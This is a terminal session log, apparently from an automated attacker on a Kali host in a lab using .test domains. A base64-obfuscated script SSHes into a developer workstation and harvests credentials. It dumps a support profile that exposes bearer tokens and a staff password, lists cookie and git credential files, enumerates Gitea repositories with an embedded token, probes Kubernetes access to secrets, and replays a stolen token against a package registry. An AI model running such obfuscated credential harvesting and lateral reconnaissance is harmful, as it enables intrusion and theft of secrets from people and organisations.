@@ -1,0 +1,78 @@
+└─$ └─$ 
+
+┌──(cinder@kali)-[~]
+└─$ └─$ base64 -d > /tmp/f8.sh <<'B64EOF'
+> c2V0ICtlClM9InNzaCAtbyBCYXRjaE1vZGU9eWVzIC1vIFN0cmljdEhvc3RLZXlDaGVja2luZz1ubyByb3dhbi1kZXYiCiRTICdiYXNoIC1zJyA8PCJSRU1PVEUiIDI+JjEgfCB0YWlsIC00MDAKc2V0ICtlCkNBPSRIT01FLy5sb2NhbC9zaGFyZS9rZXBsZXJvcHMvY2EuY3J0CkE9IkF1dGhvcml6YXRpb246IEJhc2ljICQocHJpbnRmICJyb3dhbi5pdG86ZmtfZGV2ZWxvcGVyX3lVV1RLU3FyYzE2eTNLNV81RGZRN3FhY2Z0OWItOXhvIiB8IGJhc2U2NCAtdzApIgplY2hvICI9PT09PSBTVVBQT1JUIENMSUVOVCBQUk9GSUxFID09PT09IgpjYXQgJEhPTUUvLmNvbmZpZy9maWVsZGxpbmsvc3VwcG9ydC1jbGllbnQuanNvbiAyPi9kZXYvbnVsbAplY2hvOyBlY2hvICI9PT09PSBPVEhFUiBDT05GSUcgRklMRVMgPT09PT0iCmZpbmQgJEhPTUUvLmNvbmZpZyAtbWF4ZGVwdGggMyAtdHlwZSBmIHwgc29ydAplY2hvICI9PT09PSBHSVRFQSBBTEwgUkVQT1MgPT09PT0iCmZvciB1IGluICJodHRwczovL3NvdXJjZS5rZXBsZXJvcHMudGVzdC9hcGkvdjEvdXNlci9yZXBvcz9saW1pdD0xMDAiICJodHRwczovL3NvdXJjZS5rZXBsZXJvcHMudGVzdC9hcGkvdjEvb3Jncy9maWVsZGtlc3QvcmVwb3M/bGltaXQ9MTAwIiAiaHR0cHM6Ly9zb3VyY2Uua2VwbGVyb3BzLnRlc3QvYXBpL3YxL3JlcG9zL3NlYXJjaD9xPSZsaW1pdD0xMDAiOyBkbyBlY2hvICItLS0gJHUiOyBjdXJsIC1zUyAtbSAxNSAtLWNhY2VydCAkQ0EgLUggIiRBIiAiJHUiIHwgcHl0aG9uMyAtYyAiaW1wb3J0IGpzb24sc3lzCnRyeToKIGQ9anNvbi5sb2FkKHN5cy5zdGRpbikKIGlmIGlzaW5zdGFuY2UoZCxkaWN0KTogZD1kLmdldCgnZGF0YScpIG9yIGQuZ2V0KCdyZXBvcycpIG9yIFtdCiBmb3IgciBpbiBkOiBwcmludChyLmdldCgnZnVsbF9uYW1lJykpCmV4Y2VwdCBFeGNlcHRpb24gYXMgZTogcHJpbnQoJ0VSUicsZSkiOyBkb25lCmVjaG8gIj09PT09IEs4UyA9PT09PSIKa3ViZWN0bCBjb25maWcgZ2V0LWNvbnRleHRzIDI+JjEgfCBoZWFkCmt1YmVjdGwgYXV0aCBjYW4taSAtLWxpc3QgMj4mMSB8IGhlYWQgLTMwCmVjaG8gIi0tLSBwb2RzIjsga3ViZWN0bCBnZXQgcG9kcyAtbyB3aWRlIDI+JjEgfCBoZWFkIC0zMAplY2hvICItLS0gc3ZjIjsga3ViZWN0bCBnZXQgc3ZjIDI+JjEgfCBoZWFkIC0zMAplY2hvICItLS0gZGVwbG95L3N0YXRlZnVsc2V0Ijsga3ViZWN0bCBnZXQgZGVwbG95LHN0YXRlZnVsc2V0LGRhZW1vbnNldCAyPiYxIHwgaGVhZCAtNDAKZWNobyAiLS0tIGNtIjsga3ViZWN0bCBnZXQgY20gMj4mMSB8IGhlYWQgLTQwCmVjaG8gIi0tLSBzZWNyZXRzIjsga3ViZWN0bCBnZXQgc2VjcmV0cyAyPiYxIHwgaGVhZCAtNDAKZWNobyAiPT09PT0gUkVHSVNUUlkgU1VQUE9SVC1SRUhFQVJTQUwgd2l0aCBzdXBwb3J0IGJlYXJlciA9PT09PSIKY3VybCAtc1MgLW0gMTAgLUggIkF1dGhvcml6YXRpb246IEJlYXJlciBma19zdXBwb3J0X3Jvd2FuXzJmeHRYTmtVaktNYmN2UEJsQW90MEpwMHZWTnBwTDliIiAiaHR0cHM6Ly9wYWNrYWdlcy5rZXBsZXJvcHMudGVzdC9Aa2VwbGVyb3BzJTJmc3VwcG9ydC1yZWhlYXJzYWwiIC0tY2FjZXJ0ICRDQSAtdyAiIFsle2h0dHBfY29kZX1dIjsgZWNobwpSRU1PVEUK
+> B64EOF
+
+┌──(cinder@kali)-[~]
+└─$ └─$ chmod +x /tmp/f8.sh; bash /tmp/f8.sh; echo DONEMARK_1795201145563$((6*7))
+===== SUPPORT CLIENT PROFILE =====
+{"service_url": "https://support.keplerops.test:8443", "principal": "rowan.ito", "authorization": "Bearer fk_support_rowan_2fxtXNkUjKMbcvPBlAot0Jp0vVNppL9b", "ca_file": "/home/rowan/.local/share/keplerops/ca.crt", "retained_staff_login": {"url": "https://support.keplerops.test/scp/", "username": "maya.ranscombe", "password": "sWQa31085FTQekZhHTxUyf_9E1marq0ur8WNCKmTtnk", "note": "Retained support-desk staff login left in the shared workstation profile."}}
+===== OTHER CONFIG FILES =====
+/home/rowan/.config/chromium/Default/Cookies
+/home/rowan/.config/chromium/Default/History
+/home/rowan/.config/chromium/Default/Preferences
+/home/rowan/.config/fieldlink/support-client.json
+/home/rowan/.config/git/credentials
+===== GITEA ALL REPOS =====
+--- https://source.keplerops.test/api/v1/user/repos?limit=100
+fieldkest/connector-archive
+fieldkest/fieldlink-connector
+fieldkest/policy-compiler
+fieldkest/release-signer-history
+--- https://source.keplerops.test/api/v1/orgs/fieldkest/repos?limit=100
+fieldkest/fieldlink-connector
+fieldkest/policy-compiler
+fieldkest/connector-archive
+fieldkest/release-signer-history
+--- https://source.keplerops.test/api/v1/repos/search?q=&limit=100
+fieldkest/connector-archive
+fieldkest/fieldlink-connector
+fieldkest/policy-compiler
+fieldkest/release-signer-history
+===== K8S =====
+CURRENT   NAME        CLUSTER     AUTHINFO          NAMESPACE
+*         fieldlink   fieldlink   rowan-workspace   fieldlink
+Resources                                       Non-Resource URLs                      Resource Names   Verbs
+selfsubjectreviews.authentication.k8s.io        []                                     []               [create]
+selfsubjectaccessreviews.authorization.k8s.io   []                                     []               [create]
+selfsubjectrulesreviews.authorization.k8s.io    []                                     []               [create]
+clustertrustbundles.certificates.k8s.io         []                                     []               [get list watch]
+                                                [/.well-known/openid-configuration/]   []               [get]
+                                                [/.well-known/openid-configuration]    []               [get]
+                                                [/api/*]                               []               [get]
+                                                [/api]                                 []               [get]
+                                                [/apis/*]                              []               [get]
+                                                [/apis]                                []               [get]
+                                                [/healthz]                             []               [get]
+                                                [/healthz]                             []               [get]
+                                                [/livez]                               []               [get]
+                                                [/livez]                               []               [get]
+                                                [/openapi/*]                           []               [get]
+                                                [/openapi]                             []               [get]
+                                                [/openid/v1/jwks/]                     []               [get]
+                                                [/openid/v1/jwks]                      []               [get]
+                                                [/readyz]                              []               [get]
+                                                [/readyz]                              []               [get]
+                                                [/version/]                            []               [get]
+                                                [/version/]                            []               [get]
+                                                [/version]                             []               [get]
+                                                [/version]                             []               [get]
+--- pods
+Error from server (Forbidden): pods is forbidden: User "system:serviceaccount:fieldlink:rowan-workspace" cannot list resource "pods" in API group "" in the namespace "fieldlink"
+--- svc
+Error from server (Forbidden): services is forbidden: User "system:serviceaccount:fieldlink:rowan-workspace" cannot list resource "services" in API group "" in the namespace "fieldlink"
+--- deploy/statefulset
+Error from server (Forbidden): deployments.apps is forbidden: User "system:serviceaccount:fieldlink:rowan-workspace" cannot list resource "deployments" in API group "apps" in the namespace "fieldlink"
+Error from server (Forbidden): statefulsets.apps is forbidden: User "system:serviceaccount:fieldlink:rowan-workspace" cannot list resource "statefulsets" in API group "apps" in the namespace "fieldlink"
+Error from server (Forbidden): daemonsets.apps is forbidden: User "system:serviceaccount:fieldlink:rowan-workspace" cannot list resource "daemonsets" in API group "apps" in the namespace "fieldlink"
+--- cm
+Error from server (Forbidden): configmaps is forbidden: User "system:serviceaccount:fieldlink:rowan-workspace" cannot list resource "configmaps" in API group "" in the namespace "fieldlink"
+--- secrets
+Error from server (Forbidden): secrets is forbidden: User "system:serviceaccount:fieldlink:rowan-workspace" cannot list resource "secrets" in API group "" in the namespace "fieldlink"
+===== REGISTRY SUPPORT-REHEARSAL with support bearer =====
+{
+  "error": "authorization required to access package @keplerops/support-rehearsal"
+}
+ [401]
